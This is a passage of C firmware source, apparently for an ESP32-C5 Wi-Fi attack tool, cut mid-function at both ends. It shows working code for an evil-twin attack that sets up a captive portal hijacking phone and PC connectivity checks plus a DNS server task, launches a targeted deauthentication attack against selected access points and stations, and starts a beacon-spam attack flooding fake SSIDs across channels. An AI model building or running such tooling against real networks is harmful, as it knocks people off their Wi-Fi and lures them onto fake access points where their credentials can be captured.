brokali/projectZeroTouch/ESP32C5/main/main.c
            httpd_uri_t android_captive_uri = {
                .uri = "/generate_204",
                .method = HTTP_GET,
                .handler = android_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &android_captive_uri);
            
            httpd_uri_t ios_captive_uri = {
                .uri = "/hotspot-detect.html",
                .method = HTTP_GET,
                .handler = ios_captive_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &ios_captive_uri);
            
            httpd_uri_t samsung_captive_uri = {
                .uri = "/ncsi.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &samsung_captive_uri);
            
            httpd_uri_t windows_captive_uri = {
                .uri = "/connecttest.txt",
                .method = HTTP_GET,
                .handler = captive_detection_handler,
                .user_ctx = NULL
            };
            httpd_register_uri_handler(portal_server, &windows_captive_uri);
            
            // Set portal_active flag BEFORE starting DNS task
            // (DNS task checks this flag in its loop)
            portal_active = true;
            
            // Start DNS server task
            BaseType_t dns_result = xTaskCreate(
                dns_server_task,
                "dns_server",
                4096,
                NULL,
                5,
                &dns_server_task_handle
            );
            
            if (dns_result != pdPASS) {
                MY_LOG_INFO(TAG, "Failed to create DNS server task");
                httpd_stop(portal_server);
                portal_server = NULL;
                portal_active = false;
                applicationState = IDLE;
                return 1;
            }
            
            MY_LOG_INFO(TAG, "Captive portal started successfully");
        }

        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
        
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
        
        // Show selected stations info for targeted deauth
        if (selected_stations_count > 0 && applicationState == DEAUTH) {
            MY_LOG_INFO(TAG, "Targeted mode: %d station(s)", selected_stations_count);
            for (int s = 0; s < selected_stations_count; s++) {
                MY_LOG_INFO(TAG, "  -> %02X:%02X:%02X:%02X:%02X:%02X",
                           selected_stations[s].mac[0], selected_stations[s].mac[1],
                           selected_stations[s].mac[2], selected_stations[s].mac[3],
                           selected_stations[s].mac[4], selected_stations[s].mac[5]);
            }
        }
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,  // Stack size
            NULL,
            5,     // Priority
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            applicationState = IDLE;
            return 1;
        }
        
    } else {
        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
    }
    return 0;
}

/**
 * CLI command: start_beacon_spam "SSID1" "SSID2" ...
 * Starts beacon spam attack with multiple fake SSIDs
 */
static int start_beacon_spam_internal(void) {
    MY_LOG_INFO(TAG, "Starting beacon spam with %d SSIDs:", beacon_ssid_count);
    for (int i = 0; i < beacon_ssid_count; i++) {
        MY_LOG_INFO(TAG, "  %d: %s", i + 1, beacon_ssids[i]);
    }

    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "WiFi initialization failed");
        return 1;
    }

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(100));

    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_APSTA);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_config_t ap_config = {
        .ap = {
            .ssid = "",
            .ssid_len = 0,
            .ssid_hidden = 1,
            .password = "",
            .max_connection = 0,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    esp_err_t ap_err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ap_err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set hidden AP config: %s", esp_err_to_name(ap_err));
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start WiFi: %s", esp_err_to_name(err));
        return 1;
    }

    wifi_apply_extended_country();

    vTaskDelay(pdMS_TO_TICKS(100));

    err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set channel 1: %s", esp_err_to_name(err));
    }

    {
        uint8_t first_channel = 1;
        uint8_t last_channel = 11;
        wifi_get_24ghz_channel_bounds(&first_channel, &last_channel);
        MY_LOG_INFO(TAG, "WiFi configured for beacon spam on channels %u-%u",
                   first_channel, last_channel);
    }

    beacon_spam_active = true;
    operation_stop_requested = false;

    BaseType_t result = xTaskCreate(
        beacon_spam_task,
        "beacon_spam",
        4096,
        NULL,
        5,
        &beacon_spam_task_handle
    );

    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create beacon spam task");
        beacon_spam_active = false;
        beacon_spam_task_handle = NULL;
        return 1;
    }

